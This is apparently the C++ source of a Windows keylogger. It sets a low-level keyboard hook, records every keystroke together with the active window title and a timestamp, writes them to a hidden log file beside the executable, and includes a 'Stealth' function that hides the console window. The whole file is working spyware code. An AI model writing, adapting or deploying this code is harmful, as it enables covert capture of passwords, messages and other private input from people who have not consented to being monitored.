﻿#include "constants.h"
#include "keys.h"

#include <shlwapi.h>
#include <cstdio>
#include <time.h>
#include <fstream>
#include <sstream>

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";

    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0; // ignore mouse clicks
    }

    HWND foreground = GetForegroundWindow();
    HKL layout = NULL;

    if (foreground)
    {
        DWORD dwThreadId = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(dwThreadId);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);

            // get time
            time_t t = time(NULL);
            struct tm tm;
            localtime_s(&tm, &t);
            char s[64];
            strftime(s, sizeof(s), "%Y-%m-%d %H:%M:%S", &tm);

            output << "\n\n[" << s << ": " << window_title << "]\n";
        }
    }

    switch (key_stroke)
    {
        case VK_BACK:       output << "[BACKSPACE]";    break;
        case VK_RETURN:     output << "[ENTER]";        break;
        case VK_SPACE:      output << " ";              break;
        case VK_TAB:        output << "[TAB]";          break;
        case VK_MENU:       output << "[ALT]";          break;
        case VK_ESCAPE:     output << "[ESC]";          break;
        case VK_END:        output << "[END]";          break;
        case VK_HOME:       output << "[HOME]";         break;
        case VK_LEFT:       output << "[LEFT]";         break;
        case VK_UP:         output << "[UP]";           break;
        case VK_RIGHT:      output << "[RIGHT]";        break;
        case VK_DOWN:       output << "[DOWN]";         break;
        case VK_PRIOR:      output << "[PGUP]";         break;
        case VK_NEXT:       output << "[PGDN]";         break;
        case VK_LWIN:
        case VK_RWIN:       output << "[WIN]";          break;
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:     output << "[SHIFT]";        break;
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:   output << "[CONTROL]";      break;
        case VK_OEM_PERIOD:
        case VK_DECIMAL:    output << ".";              break;
        case VK_OEM_MINUS:  output << "-";              break;
        case VK_CAPITAL:    output << "[CAPSLOCK]";     break;
        default:
            // check caps lock
            bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

            // check shift key
            if ((GetKeyState(VK_SHIFT) & 0x1000) != 0
                || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
                || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
            {
                lowercase = !lowercase;
            }

            // map virtual key according to keyboard layout
            char key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

            if (lowercase)
            {
                switch (key)
                {
                    case '1':   key = '!'; break;
                    case '2':   key = '@'; break;
                    case '3':   key = '#'; break;
                    case '4':   key = '$'; break;
                    case '5':   key = '%'; break;
                    case '6':   key = '^'; break;
                    case '7':   key = '&'; break;
                    case '8':   key = '*'; break;
                    case '9':   key = '('; break;
                    case '0':   key = ')'; break;
                    case '-':   key = '_'; break;
                    case '=':   key = '+'; break;
                    case '[':   key = '{'; break;
                    case ']':   key = '}'; break;
                    case '\\':  key = '|'; break;
                    case '\'':  key = '"'; break;
                    case ';':   key = ':'; break;
                    case '/':   key = '?'; break;
                    case '.':   key = '>'; break;
                    case ',':   key = '<'; break;
                }
            }
            else
            {
                key = tolower(key);
            }

            output << char(key);
    }

    WriteLog(output.str());
    
    return 0;
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN)
        {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            Save(kbdStruct.vkCode);
        }
    }

    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        _RPT0(_CRT_WARN, __FUNCTION__ ": Failed to install hook!\n");
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

void Stealth()
{
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
}

BOOL WriteLog(const std::string& contents)
{
    // Set current working directory.
    WCHAR cwd[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, cwd, MAX_PATH);
    PathRemoveFileSpec(cwd); // shlwapi.lib
    SetCurrentDirectory(cwd);

    HANDLE hFile = CreateFile(
        OUTPUT_FILE_NAME,
        FILE_APPEND_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_ALWAYS, // open existing or create new file
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NORMAL,
        NULL);
    
    if (hFile == INVALID_HANDLE_VALUE)
    {
        _RPT2(_CRT_ERROR, __FUNCTION__ ": Could not create or open output file '%s' (0x%x)\n", OUTPUT_FILE_NAME, GetLastError());
        exit(1);
    }

    _RPT2(_CRT_WARN, __FUNCTION__ ": Obtained handle to '%s' [0x%x]\n", OUTPUT_FILE_NAME, hFile);

    DWORD dwBytesWritten = 0;
    if (!WriteFile(hFile, contents.c_str(), contents.length(), &dwBytesWritten, NULL))
    {
        _RPT2(_CRT_ERROR, __FUNCTION__ ": Failed to write to '%s' (0x%x)\n", OUTPUT_FILE_NAME, GetLastError());
        exit(1);
    }

    _RPT2(_CRT_WARN, __FUNCTION__ ": Wrote %s [%d bytes]\n", contents.c_str(), dwBytesWritten);
    if (hFile) CloseHandle(hFile);
    return dwBytesWritten != 0;
}